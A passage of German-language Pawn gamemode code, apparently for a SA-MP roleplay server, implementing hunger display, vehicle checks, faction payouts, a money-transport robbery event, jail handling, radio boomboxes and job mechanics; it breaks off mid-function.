public ErstellenHunger(playerid)
{
    PlayerTextDrawDestroy(playerid,Hungeranzeige[playerid]);
	Hungeranzeige[playerid] = CreatePlayerTextDraw(playerid,607.00-((100-SpielerInfo[playerid][uHunger])/1.754), 59.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Hungeranzeige[playerid], 255);
	PlayerTextDrawFont(playerid,Hungeranzeige[playerid], 1);
	PlayerTextDrawLetterSize(playerid,Hungeranzeige[playerid], 0.549998, 0.099999);
	PlayerTextDrawColor(playerid,Hungeranzeige[playerid], -65281);
	PlayerTextDrawSetOutline(playerid,Hungeranzeige[playerid], 0);
	PlayerTextDrawSetProportional(playerid,Hungeranzeige[playerid], 1);
	PlayerTextDrawSetShadow(playerid,Hungeranzeige[playerid], 1);
	PlayerTextDrawUseBox(playerid,Hungeranzeige[playerid], 1);
	PlayerTextDrawBoxColor(playerid,Hungeranzeige[playerid], -65281);
	PlayerTextDrawTextSize(playerid,Hungeranzeige[playerid], 546.000000, 5.000000);
	PlayerTextDrawShow(playerid, Hungeranzeige[playerid]);
	return 1;
}

forward Editing(playerid);
public Editing(playerid)
{
	EditDynamicObject(playerid,EditingObject[playerid]);
	return 1;
}
forward SendRadiusMessage(playerid, Float:radi, const string[], color);
public SendRadiusMessage(playerid, Float:radi, const string[], color)
{
	new Float:X,Float:Y,Float:Z;
 	GetPlayerPos(playerid,X,Y,Z);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
		    if(IsPlayerInRangeOfPoint(i, radi, X, Y, Z))
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
	return 1;
}
IstEinKeinFuehrerscheinFahrzeug(carid)
{
	new model = GetVehicleModel(carid);
  	if(model == 509 || model == 481 || model == 510 || model == 539)
   	{
		return 1;
	}
	return 0;
}
stock IstEinFlugzeug(carid)
{
	new model = GetVehicleModel(carid);
  	if(model == 460 || model == 476 || model == 511 || model == 512 || model == 513 || model == 519 || model == 520 || model == 553 || model == 577 || model == 592 || model == 593)
   	{
		return 1;
	}
	return 0;
}
stock IstEinHeli(carid)
{
 	new model = GetVehicleModel(carid);
  	if(model == 417 || model == 425 || model == 447 || model == 469 || model == 487 || model == 488 || model == 497 || model == 548 || model == 563)
   	{
		return 1;
	}
	return 0;
}
stock IstModellHeli(model)
{
  	if(model == 417 || model == 425 || model == 447 || model == 469 || model == 487 || model == 488 || model == 497 || model == 548 || model == 563)
   	{
		return 1;
	}
	return 0;
}
stock IstEinBoot(carid)
{
 	new model = GetVehicleModel(carid);
  	if(model == 472 || model == 473 || model == 493 || model == 595 || model == 484 || model == 430 || model == 453 || model == 452 || model == 446 || model == 454)
   	{
		return 1;
	}
	return 0;
}
stock IstModellBoot(model)
{
  	if(model == 472 || model == 473 || model == 493 || model == 595 || model == 484 || model == 430 || model == 453 || model == 452 || model == 446 || model == 454)
   	{
		return 1;
	}
	return 0;
}
stock IstEinMotorrad(carid)
{
 	new model = GetVehicleModel(carid);
  	if(model == 581 || model == 522 || model == 461 || model == 521 || model == 523 || model == 463 || model == 586 || model == 468 || model == 471)
   	{
		return 1;
	}
	return 0;
}
stock IstEinRoller(carid)
{
	new model = GetVehicleModel(carid);
  	if(model == 462 || model == 448)
   	{
		return 1;
	}
	return 0;
}
stock IstEinLKW(carid)
{
	new model = GetVehicleModel(carid);
  	if(model == 524 || model == 578 || model == 455 || model == 403 || model == 414 || model == 443 || model == 514 || model == 515 || model == 408 || model == 456 || model == 431 || model == 433 || model == 437 || model == 427 || model == 407 || model == 544 || model == 432 || model == 601 || model == 573 || model == 508 || model == 532 || model == 486 || model == 406 || model == 428)
   	{
		return 1;
	}
	return 0;
}
GetDistanceToLastPoint(vehicleid)
{
	new Float:x2, Float:y2, Float:z2, Float:output;
 	GetVehiclePos(vehicleid, x2, y2, z2);
  	output = floatsqroot(floatpower(floatabs(floatsub(x2, VehiclePosX[vehicleid])), 2)+floatpower(floatabs(floatsub(y2, VehiclePosY[vehicleid])), 2)+floatpower(floatabs(floatsub(z2, VehiclePosZ[vehicleid])), 2));
   	return floatround(output);
}

SaveCoords(vehicleid)
{
    new Float:X, Float:Y, Float:Z;
    GetVehiclePos(vehicleid, X, Y, Z);
    VehiclePosX[vehicleid]=X;
    VehiclePosY[vehicleid]=Y;
    VehiclePosZ[vehicleid]=Z;
}
IsVehicleInRangeOfPoint(vehicleid, Float:range, Float:x, Float:y, Float:z)
{
	new Float:X,Float:Y,Float:Z;
	GetVehiclePos(vehicleid,X,Y,Z);
	X -= x;
	Y -= y;
	Z -= z;
	return ((X * X) + (Y * Y) + (Z * Z)) < (range * range);
}
FraktionsNachricht(Fraktion, color, const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
		    if(IstSpielerInFrak(i,Fraktion))
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
	return 1;
}
IstSpielerInFrak(playerid,Fraktion)
{
	if(SpielerInfo[playerid][uMitglied] == Fraktion || SpielerInfo[playerid][uLeiter] == Fraktion) return 1;
	return 0;
}
FraktionsUserOnline(Fraktion)
{
	new user = 0;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uEingeloggt] == 1)
	    {
	        if(SpielerInfo[i][uMitglied] == Fraktion || SpielerInfo[i][uLeiter] == Fraktion)
	        {
	            user++;
	        }
	    }
	}
	return user;
}
GetVehicleDriver(vehicleid)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i) && GetPlayerVehicleID(i) == vehicleid && GetPlayerVehicleSeat(i) == 0)
     	{
      		return i;
	    }
	}
	return INVALID_PLAYER_ID;
}
new abfragexd;



forward Update();
public Update()
{
    if(frakpayday < 1)
    {
        frakpayday = 60*60;
       	for(new x = 0; x < 5; x++)
		{
			if(GWInfo[x][GWBesitzer] == 7)
			{
			    Fraktionskasse[7] += 200.0;
			    LInfo[0][matss] += 10;
				Frakkassespeichern(7);
			}
			if(GWInfo[x][GWBesitzer] == 8)
			{
			    Fraktionskasse[8] += 200.0;
			    LInfo[1][matss] += 10; Frakkassespeichern(8);
			}
			if(GWInfo[x][GWBesitzer] == 9)
			{
			    Fraktionskasse[9] += 200.0;
			    LInfo[2][matss] += 10; Frakkassespeichern(9);
			}
			if(GWInfo[x][GWBesitzer] == 10)
			{
			    Fraktionskasse[10] += 200.0;
			    LInfo[3][matss] += 10; Frakkassespeichern(10);
			}
			if(GWInfo[x][GWBesitzer] == 11)
			{
				Fraktionskasse[11] += 200.0;
				LInfo[4][matss] += 10; Frakkassespeichern(11);
			}
			if(GWInfo[x][GWBesitzer] == 16)
			{
				Fraktionskasse[11] += 200.0;
				LInfo[5][matss] += 10; Frakkassespeichern(16);
			}
			if(GWInfo[x][GWBesitzer] == 17)
			{
				Fraktionskasse[11] += 200.0;
				LInfo[6][matss] += 10; Frakkassespeichern(17);
			}
		}
    }
	else
    {
        frakpayday --;
    }

	new string[200], Year, Month, Day, Hour, Minute, Second,twaffe,tmuni,Float:ruestung,Float:health;
	getdate(Year, Month, Day);
	gettime(Hour, Minute, Second);
    if(Hour == 0)
    {
        SetWorldTime(0);
	}
	if(Hour == 1)
    {
        SetWorldTime(1);
	}
	if(Hour == 2)
    {
        SetWorldTime(2);
	}
	if(Hour == 3)
    {
        SetWorldTime(3);
	}
	if(Hour == 4)
    {
        SetWorldTime(4);
	}
	if(Hour == 5)
    {
        SetWorldTime(5);
	}
	if(Hour == 6)
    {
        SetWorldTime(6);
	}
	if(Hour == 7)
    {
        SetWorldTime(7);
	}
	if(Hour == 8)
    {
        SetWorldTime(8);
	}
	if(Hour == 9)
    {
        SetWorldTime(9);
	}
	if(Hour == 10)
    {
        SetWorldTime(10);
	}
	if(Hour == 11)
    {
        SetWorldTime(11);
	}
	if(Hour == 12)
    {
        SetWorldTime(12);
	}
	if(Hour == 13)
    {
        SetWorldTime(13);
	}
	if(Hour == 14)
    {
        SetWorldTime(14);
	}
	if(Hour == 15)
    {
        SetWorldTime(15);
	}
	if(Hour == 16)
    {
        SetWorldTime(16);
	}
	if(Hour == 17)
    {
        SetWorldTime(17);
	}
	if(Hour == 18)
    {
        SetWorldTime(18);
	}
	if(Hour == 19)
    {
        SetWorldTime(19);
	}
	if(Hour == 20)
    {
        SetWorldTime(20);
	}
	if(Hour == 21)
    {
        SetWorldTime(21);
	}
	if(Hour == 22)
    {
        SetWorldTime(22);
	}
	if(Hour == 23)
    {
        SetWorldTime(23);
	}
	abfragexd += 1;
    if(abfragexd > 10)
    {
    
        abfragexd = 0;
        for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		    {
				if(IsPlayerInArea(i, 4457.8838, -8772.0039, 4647.8730, -8630.6553) && SpielerInfo[i][uLeiter] != 1 && SpielerInfo[i][uLeiter] != 2 && SpielerInfo[i][uLeiter] != 3 && SpielerInfo[i][uLeiter] != 4 && SpielerInfo[i][uLeiter] != 5 && SpielerInfo[i][uLeiter] != 13 && SpielerInfo[i][uLeiter] != 14 &&
				SpielerInfo[i][uLeiter] != 15 && SpielerInfo[i][uMitglied] != 1 && SpielerInfo[i][uMitglied] != 2 && SpielerInfo[i][uMitglied] != 3 && SpielerInfo[i][uMitglied] != 4 && SpielerInfo[i][uMitglied] != 5 && SpielerInfo[i][uMitglied] != 13 && SpielerInfo[i][uMitglied] != 14 && SpielerInfo[i][uMitglied] != 15 && SpielerInfo[i][uKnastZeit] == 0)
				{
					FraktionsNachricht(15,COLOR_YELLOW,"HQ: Es befindet sich jemand im Gebiet der U.S. Army!");
					break;
				}
			}
		}
	}
	if(gangwaran == 1)
	{
	    if(punktezahlen == 27)
		{
		    Gangwarpunkten();
		    punktezahlen = 0;
		}
		else
		{
		    punktezahlen ++;
		}
	}
	if(geldtransporteraktiv == 0 && geldtransportertime >= 1)
	{
	    geldtransportertime--;
	    if(geldtransportertime == 0)
	    {
	        geldtransporteraktiv = 1;
	        geldtransportertime = 0;
	    }
	}
	if(geldtransporteraktiv == 1 && geldtransportertime == 0)
	{
	    new cops = 0;
     	for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1)
		    {
		        if(IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2) || IstSpielerInFrak(i,15))
		        {
			        cops++;
			        if(cops == 2) break;
				}
		    }
		}
		if(cops == 2)
		{
		    geldtransporteraktiv = 2;
		    SendClientMessageToAll(COLOR_RED,  "|--------------------- GELDTRANSPORTER ---------------------|");
		    SendClientMessageToAll(COLOR_WHITE,"* Es gibt einen Geldtransporter an der Bank in Lake Sorten");
		    SendClientMessageToAll(COLOR_WHITE,"* Der Geldtransporter wird vom Police Department überführt!");
            geldtransporter = CreateVehicle(428,1576.5690,-8560.5098,2.2518,179.9346,1,16,-1);
            new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(geldtransporter, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(geldtransporter, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
			Motorschaden2[geldtransporter] = 0;
            geldtransporterdriver = -1;
            //SetVehicleHealth(geldtransporter, 3000); (ES SPAMMT PERM GELDHACK)
            Benzin[geldtransporter] = AutoDaten[GetVehicleModel(geldtransporter)-399][MaxBenzin];
		}
		else
		{
		    geldtransporteraktiv = 0;
		    geldtransportertime = 3600;
		}
	}
	if(geldtransporteraktiv == 2)
	{
	    for(new b = 0; b < MAX_PLAYERS; b++)
	    {
		    if(IsPlayerInArea(b,6401.4805,-7724.7935,6429.1665,-7714.1221))
		    {
                if(IstSpielerInFrak(b,1) || IstSpielerInFrak(b,2) || IstSpielerInFrak(b,15))
                {
                    new playerState = GetPlayerState(b); // Get the killer's state
                    new vehi = GetPlayerVehicleID(b);
				    if(playerState == PLAYER_STATE_DRIVER) // If the killer was in a vehicle
				    {
				        if(geldtransporterdriver == b && vehi == geldtransporter)
				        {
					        SendClientMessageToAll(COLOR_GREEN,"* Der Geldtransporter wurde von den Polizisten überführt!");
					        SetTimerEx("Freezetransport",1000,0,"d",b);
					        Freeze(b);
					        Fraktionskasse[1] += 3000;
				    		Frakkassespeichern(1);
				    		Fraktionskasse[2] += 3000;
				    		Frakkassespeichern(2);
				    		Fraktionskasse[15] += 3000;
				    		Frakkassespeichern(15);
	                    	DisablePlayerCheckpoint(b);
	                    	DestroyVehicle(geldtransporter);
	                    	geldtransporterdriver = -1;
	                    	geldtransportertime = 18000;
	                    	geldtransporteraktiv = 0;
	                    	geldtransporter = -1;
						}
				    }
                }
		    }
			new Float:bx,Float:by,Float:bz;
		    GetPlayerPos(b,bx,by,bz);
		    if(IsPlayerInArea(b,4090.6509,-8576.3955,4115.8042,-8555.7061) && bz >= 119)
		    {
                if(!IstSpielerInFrak(b,1) && !IstSpielerInFrak(b,2) && !IstSpielerInFrak(b,15))
                {
                    new playerState = GetPlayerState(b); // Get the killer's state
                    new vehi = GetPlayerVehicleID(b);
				    if(playerState == PLAYER_STATE_DRIVER) // If the killer was in a vehicle
				    {
				        if(geldtransporterdriver == b && vehi == geldtransporter)
				        {
					        SendClientMessageToAll(COLOR_GREEN,"* Der Geldtransporter wurde von einem Spieler abgegeben!");
	                    	DisablePlayerCheckpoint(b);
	                    	SetTimerEx("Freezetransport",1000,0,"d",b);
					        Freeze(b);
	                    	DestroyVehicle(geldtransporter);
	                    	geldtransporterdriver = -1;
	                    	geldtransportertime = 18000;
	                    	geldtransporteraktiv = 0;
	                    	PlayerTextDrawShow(b,Bankklau[b][0]);
				            PlayerTextDrawShow(b,Bankklau[b][1]);
				            Bankraubtextdraw[b] = 1;
				            SendClientMessage(b,COLOR_YELLOW,"Das Geld landet im Rucksack! Sobald du 15 Minuten auf der Flucht warst, bekommst du es!");
	                        /*Moneybag[playerid] = CreateObject(1550, 0.0, 0.0, 0.0, 0.0, 0, 0.0);
							AttachObjectToPlayer(Moneybag[playerid], playerid, 0,-0.237999,-0.093999, 0.200000,0,166.100006);*/
							SetPlayerAttachedObject(b, 3, 1550, 1, 0.070999,-0.285000,0.016999,3.200000,84.000015,0.699999,0.913000,0.907999,0.778000);
							Moneytimer[b] = SetTimerEx("Gelderhalten",1000*60*1,0,"d",b);
							Bankraubgeld[b] = 4926;
							format(string,sizeof string,"$ %.2f",Bankraubgeld[b]);
							PlayerTextDrawSetString(b,Bankklau[b][1],string);
							geldtransporter = -1;
						}
				    }
                }
		    }
		}
	}
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uEingeloggt] == 1)
	    {
	        if(SpielerInfo[i][uGefangen] == 1 || SpielerInfo[i][uGefangen] == 2 || SpielerInfo[i][uGefangen] == 3)
	        {
	            if(SpielerInfo[i][uGefangen] == 1 && !IsPlayerInArea(i,1555.9341,-9482.7002,1566.0934,-9477.1035))
	            {
	                new rand = random(sizeof(KnastSpawns));
					Streamer_UpdateEx(i,KnastSpawns[rand][0],KnastSpawns[rand][1],KnastSpawns[rand][2]);
					Teleport(i,KnastSpawns[rand][0],KnastSpawns[rand][1],KnastSpawns[rand][2]);
					SpielerInfo[i][uGefangen] = 1;
	            }
	            else if(SpielerInfo[i][uGefangen] == 2 && !IsPlayerInArea(i,6486.2651,-7893.8066,6495.1343,-7883.6665))
	            {
				    new rand = random(sizeof(KnastSpawnsSF));
					Streamer_UpdateEx(i,KnastSpawnsSF[rand][0],KnastSpawnsSF[rand][1],KnastSpawnsSF[rand][2]);
					Teleport(i,KnastSpawnsSF[rand][0],KnastSpawnsSF[rand][1],KnastSpawnsSF[rand][2]);
					SpielerInfo[i][uGefangen] = 2;
	            }
	            else if(SpielerInfo[i][uGefangen] == 3 && !IsPlayerInArea(i,4502.1260,-8757.3525,4551.0356,-8683.8008))
	            {
				    new rand = random(sizeof(KnastSpawnsARMY));
					Streamer_UpdateEx(i,KnastSpawnsARMY[rand][0],KnastSpawnsARMY[rand][1],KnastSpawnsARMY[rand][2]);
					Teleport(i,KnastSpawnsARMY[rand][0],KnastSpawnsARMY[rand][1],KnastSpawnsARMY[rand][2]);
					SpielerInfo[i][uGefangen] = 3;
	            }
			}
			if(SpielerInfo[i][uStrafe] > 0 && !IsPlayerInArea(i,8939.3057,-9599.6123,8994.9219,-9545.3896))
			{
			    Teleport(i,8969.2412,-9572.3955,2.3988);
			}
			if(SpielerInfo[i][uAngelnerlaubt] != 0)
			{
			    SpielerInfo[i][uAngelnerlaubt] --;
			    if(SpielerInfo[i][uAngelnerlaubt] == 0)
			    {
			        SpielerInfo[i][uAngelnerlaubt] = 0;
			        SpielerInfo[i][uAngelnerlaubt2] = 0;
			        SendClientMessage(i,COLOR_GREEN,"Du kannst nun wieder Angeln!");
			    }
			}
     		if(IsPlayerInRangeOfPoint(i,25,BoomBox[0][0],BoomBox[0][1],BoomBox[0][2]) && Musikbox[0] >= 0)
	        {
	            if(Musikboxm[0] == 1)
	            {
	                if(Musikboxdrinne[i] == 0)
	                {
		                PlayAudioStreamForPlayer(i, "https://iloveradio.de/iloveradio.m3u",BoomBox[0][0],BoomBox[0][1],BoomBox[0][2],30,1);
		                Musikboxdrinne[i] = 1;
					}

	            }
	            if(Musikboxm[0] == 2)
	            {
	                if(Musikboxdrinne[i] == 0)
	                {
		                PlayAudioStreamForPlayer(i, "https://dg-wdr-https-fra-dtag-cdn.sslcast.addradio.de/wdr/1live/live/mp3/128/stream.mp3",BoomBox[0][0],BoomBox[0][1],BoomBox[0][2],30,1);
		                Musikboxdrinne[i] = 1;
					}

	            }
	            if(Musikboxm[0] == 3)
	            {
	                if(Musikboxdrinne[i] == 0)
	                {
		                PlayAudioStreamForPlayer(i, "http://streams.bigfm.de/bigfm-deutschland-128-mp3?usid=0-0-H-M-D-12",BoomBox[0][0],BoomBox[0][1],BoomBox[0][2],30,1);
		                Musikboxdrinne[i] = 1;
					}

	            }
	        }
	        else if(IsPlayerInRangeOfPoint(i,25,BoomBox[1][0],BoomBox[1][1],BoomBox[1][2]) && Musikbox[1] >= 0)
	        {
	            if(Musikboxm[1] == 1)
	            {
	                if(Musikboxdrinne[i] == 0)
	                {
		                PlayAudioStreamForPlayer(i, "https://iloveradio.de/iloveradio.m3u",BoomBox[1][0],BoomBox[1][1],BoomBox[1][2],30,1);
		                Musikboxdrinne[i] = 1;
					}

	            }
	            if(Musikboxm[1] == 2)
	            {
	                if(Musikboxdrinne[i] == 0)
	                {
		                PlayAudioStreamForPlayer(i, "https://dg-wdr-https-fra-dtag-cdn.sslcast.addradio.de/wdr/1live/live/mp3/128/stream.mp3",BoomBox[1][0],BoomBox[1][1],BoomBox[1][2],30,1);
		                Musikboxdrinne[i] = 1;
					}

	            }
	            if(Musikboxm[1] == 3)
	            {
	                if(Musikboxdrinne[i] == 0)
	                {
		                PlayAudioStreamForPlayer(i, "http://streams.bigfm.de/bigfm-deutschland-128-mp3?usid=0-0-H-M-D-12",BoomBox[1][0],BoomBox[1][1],BoomBox[1][2],30,1);
		                Musikboxdrinne[i] = 1;
					}

	            }
	        }
	        else if(IsPlayerInRangeOfPoint(i,25,BoomBox[2][0],BoomBox[2][1],BoomBox[2][2]) && Musikbox[2] >= 0)
	        {
	            if(Musikboxm[2] == 1)
	            {
	                if(Musikboxdrinne[i] == 0)
	                {
		                PlayAudioStreamForPlayer(i, "https://iloveradio.de/iloveradio.m3u",BoomBox[2][0],BoomBox[2][1],BoomBox[2][2],30,1);
		                Musikboxdrinne[i] = 1;
					}
	            }
  	          	if(Musikboxm[2] == 2)
	            {
	                if(Musikboxdrinne[i] == 0)
	                {
		                PlayAudioStreamForPlayer(i, "https://dg-wdr-https-fra-dtag-cdn.sslcast.addradio.de/wdr/1live/live/mp3/128/stream.mp3",BoomBox[2][0],BoomBox[2][1],BoomBox[2][2],30,1);
		                Musikboxdrinne[i] = 1;
					}

	            }
	            if(Musikboxm[2] == 3)
	            {
	                if(Musikboxdrinne[i] == 0)
	                {
		                PlayAudioStreamForPlayer(i, "http://streams.bigfm.de/bigfm-deutschland-128-mp3?usid=0-0-H-M-D-12",BoomBox[2
						][0],BoomBox[2][1],BoomBox[2][2],30,1);
		                Musikboxdrinne[i] = 1;
					}

	            }
	        }
	        else
	        {
	            if(Musikboxdrinne[i] == 1)
	            {
	            	Musikboxdrinne[i] = 0;
					StopAudioStreamForPlayer(i);
				}
	        }
	        if(sireneaktivbomb == 1)
	        {
		        if(IsPlayerInRangeOfPoint(i,200,1773.2511,-9346.1758,4.4124) && playersirene[i] != 1)
	     	    {
					playersirene[i] = 1;
	            	PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/sirene.mp3",1773.2511,-9346.1758,4.4124,400.0, 1);//Lake Sorten
				}
				else if(IsPlayerInRangeOfPoint(i,100,6388.7686,-7735.3823,4.3759) && playersirene[i] != 2)
				{
				    playersirene[i] = 2;
					PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/sirene.mp3",6388.7686,-7735.3823,4.3759,400.0, 1);//Santa Felton
				}
				else if(IsPlayerInRangeOfPoint(i,100,6341.7388,-9307.4414,4.4197) && playersirene[i] != 3)
				{
				    playersirene[i] = 3;
	                PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/sirene.mp3",6341.7388,-9307.4414,4.4197,300.0, 1);//Lake Vortex
				}
				else if(IsPlayerInRangeOfPoint(i,100,4480.4688,-8701.7871,8.1025) && playersirene[i] != 4)
				{
				    playersirene[i] = 4;
				    PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/sirene.mp3",4480.4688,-8701.7871,8.1025,400.0, 1);//Army
				}
			}
			if(SpielerInfo[i][uEingeloggt] == 1)
			{
			    SpielerInfo[i][contime]++;
			    WFrak(i);
			    if(gangwaran == 1 && Mitglied[i] == gangwarteam1 || gangwaran == 1 && Mitglied[i] == gangwarteam2)
			    {
			        new gtext1[20],gtext2[20];
			        if(gangwarteam1 == 7)
			        {
			            gtext1 = "~p~B";
			        }
			        if(gangwarteam1 == 8)
			        {
			            gtext1 = "~g~G";
			        }
			        if(gangwarteam1 == 9)
			        {
			            gtext1 = "~b~A";
			        }
			        if(gangwarteam1 == 10)
			        {
			            gtext1 = "~l~L";
			        }
			        if(gangwarteam1 == 11)
			        {
			            gtext1 = "~l~Y";
			        }
			        if(gangwarteam1 == 16)
			        {
			            gtext1 = "~y~V";
			        }
			        if(gangwarteam1 == 17)
			        {
			            gtext1 = "~b~B";
			        }
			        if(gangwarteam2 == 7)
			        {
			            gtext2 = "~p~B";
			        }
			        if(gangwarteam2 == 8)
			        {
			            gtext2 = "~g~G";
			        }
			        if(gangwarteam2 == 9)
			        {
			            gtext2 = "~b~A";
			        }
			        if(gangwarteam2 == 10)
			        {
			            gtext2 = "~l~L";
			        }
			        if(gangwarteam2 == 11)
			        {
			            gtext2 = "~l~Y";
			        }
					if(gangwarteam2 == 16)
			        {
			            gtext2 = "~y~V";
			        }
			        if(gangwarteam2 == 17)
			        {
			            gtext2 = "~b~B";
			        }
			        new str1[20];
			        new str2[20];
			        format(str1,sizeof str1,"%s",gtext1);
					TextDrawSetString(GangwarT[0],str1);
			        format(str2,sizeof str2,"%s",gtext2);
					TextDrawSetString(GangwarT[1],str2);
					new str3[20];
			        format(str3,sizeof str3,"Punkte: %d",gangwarteam1kills);
					TextDrawSetString(GangwarT[2],str3);
					new str4[20];
			        format(str4,sizeof str4,"Punkte: %d",gangwarteam2kills);
					TextDrawSetString(GangwarT[3],str4);
			    }
			    if(gettime()-2 < SpielerInfo[i][uDesktop])
				{
				if(SpielerInfo[i][uAFK] != 300) SpielerInfo[i][uAFK]++;
			    if(SpielerInfo[i][uJob] == 1 && IsPlayerAttachedObjectSlotUsed(i,9) && GetVehicleModel(GetClosestVehicle(i)) == 408)
			    {
			        new Float:X,Float:Y,Float:Z,Float:RZ, veh = GetClosestVehicle(i),str[150];
			        GetVehiclePos(veh,X,Y,Z);
					GetVehicleZAngle(veh,RZ);
					if(RZ >= 45 && RZ <= 135 && IsPlayerInRangeOfPoint(i,2.0,X+4,Y,Z-0.6))
					{
						new Float:geld = 12+random(5);
						GebeGeld(i,geld);
						format(str,sizeof(str),"Müllsack entsorgt: %.2f$",geld);
						SendClientMessage(i,COLOR_GREEN,str);
					    ClearAnimations(i);
					    SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
					    ApplyAnimation(i, "RYDER", "VAN_THROW", 4.2, 0, 0, 0, 0, 0);
					    RemovePlayerAttachedObject(i, 9);
					    for(new t = 0; t < MAX_PLAYERS;t++)
					    {
					        if(GetPlayerVehicleID(t) == veh)
					        {
						        if(GetPlayerState(t) == PLAYER_STATE_DRIVER)
						        {
                                    GebeGeld(t,geld);
                                    format(str,sizeof(str),"Müllsack entsorgt: %.2f$",geld);
									SendClientMessage(t,COLOR_GREEN,str);
									break;
						        }
	   						}
					    }
					}
					else if(RZ >= 135 && RZ <= 225 && IsPlayerInRangeOfPoint(i,2.0,X,Y+4,Z-0.6))
					{
						new Float:geld = 8+random(5);
						GebeGeld(i,geld);
						format(str,sizeof(str),"Müllsack entsorgt: %.2f$",geld);
						SendClientMessage(i,COLOR_GREEN,str);
					    ClearAnimations(i);
					    SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
					    ApplyAnimation(i, "RYDER", "VAN_THROW", 4.2, 0, 0, 0, 0, 0);
                        RemovePlayerAttachedObject(i, 9);
                        for(new t = 0; t < MAX_PLAYERS;t++)
					    {
					        if(GetPlayerVehicleID(t) == veh)
					        {
						        if(GetPlayerState(t) == PLAYER_STATE_DRIVER)
						        {
                                    GebeGeld(t,geld);
                                    format(str,sizeof(str),"Müllsack entsorgt: %.2f$",geld);
									SendClientMessage(t,COLOR_GREEN,str);
									break;
						        }
	   						}
					    }
					}
					else if(RZ >= 225 && RZ <= 315 && IsPlayerInRangeOfPoint(i,2.0,X-4,Y,Z-0.6))
					{
						new Float:geld = 8+random(5);
						GebeGeld(i,geld);
						format(str,sizeof(str),"Müllsack entsorgt: %.2f$",geld);
						SendClientMessage(i,COLOR_GREEN,str);
					    ClearAnimations(i);
					    SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
					    ApplyAnimation(i, "RYDER", "VAN_THROW", 4.2, 0, 0, 0, 0, 0);
                        RemovePlayerAttachedObject(i, 9);
                        for(new t = 0; t < MAX_PLAYERS;t++)
					    {
					        if(GetPlayerVehicleID(t) == veh)
					        {
						        if(GetPlayerState(t) == PLAYER_STATE_DRIVER)
						        {
                                    GebeGeld(t,geld);
                                    format(str,sizeof(str),"Müllsack entsorgt: %.2f$",geld);
									SendClientMessage(t,COLOR_GREEN,str);
									break;
						        }
	   						}
					    }
					}
					else if((RZ >= 315 || RZ <= 45) && IsPlayerInRangeOfPoint(i,2.0,X,Y-4,Z-0.6))
					{
						new Float:geld = 8+random(5);
						GebeGeld(i,geld);
						format(str,sizeof(str),"Müllsack entsorgt: %.2f$",geld);
						SendClientMessage(i,COLOR_GREEN,str);
					    ClearAnimations(i);
					    SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
					    ApplyAnimation(i, "RYDER", "VAN_THROW", 4.2, 0, 0, 0, 0, 0);
                        RemovePlayerAttachedObject(i, 9);
                        for(new t = 0; t < MAX_PLAYERS;t++)
					    {
					        if(GetPlayerVehicleID(t) == veh)
					        {
						        if(GetPlayerState(t) == PLAYER_STATE_DRIVER)
						        {
                                    GebeGeld(t,geld);
                                    format(str,sizeof(str),"Müllsack entsorgt: %.2f$",geld);
									SendClientMessage(t,COLOR_GREEN,str);
									break;
						        }
	   						}
					    }
					}
			    }

			    if(SpielerInfo[i][uJob] == 5 && IsPlayerAttachedObjectSlotUsed(i,9) && GetVehicleModel(GetClosestVehicle(i)) == 498 && PlayerProdukt[i] == 10 || SpielerInfo[i][uJob] == 5 && IsPlayerAttachedObjectSlotUsed(i,9) && GetVehicleModel(GetClosestVehicle(i)) == 414 && PlayerProdukt[i] == 10 || SpielerInfo[i][uJob] == 5 && IsPlayerAttachedObjectSlotUsed(i,9) && GetVehicleModel(GetClosestVehicle(i)) == 499 && PlayerProdukt[i] == 10)
			    {
			        new Float:X,Float:Y,Float:Z,Float:RZ, veh = GetClosestVehicle(i),str[150];
			        GetVehiclePos(veh,X,Y,Z);
					GetVehicleZAngle(veh,RZ);
					if(RZ >= 45 && RZ <= 135 && IsPlayerInRangeOfPoint(i,3.0,X+5,Y,Z-0.6) && PlayerTruckmodus[i] == 2)
					{
					    vehicleprodukte[veh] += PlayerProdukt[i];
					    PlayerProdukt[i] = 0;
						format(str,sizeof(str),"Produkte eingeladen. Es sind %d/100. Hol noch welche..",vehicleprodukte[veh]);
						SendClientMessage(i,COLOR_GREEN,str);
					    ClearAnimations(i);
					    SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
					    ApplyAnimation(i, "RYDER", "VAN_THROW", 4.2, 0, 0, 0, 0, 0);
					    RemovePlayerAttachedObject(i, 9);
			    		if(vehicleprodukte[veh] == 100)
					    {
					    	SendClientMessage(i,COLOR_GREEN,"Gut! Dein Truck ist nun beladen. Du kannst nun zum ersten Laden fahren. ( Checkpoint )");
					    	SetPlayerCheckpoint(i,6419.5078,-9155.7246,4.2146-1,5);
					    	PlayerTruckmodus[i] = 3;
					    }
					}
					else if(RZ >= 135 && RZ <= 225 && IsPlayerInRangeOfPoint(i,3.0,X,Y+5,Z-0.6) && PlayerTruckmodus[i] == 2)
					{
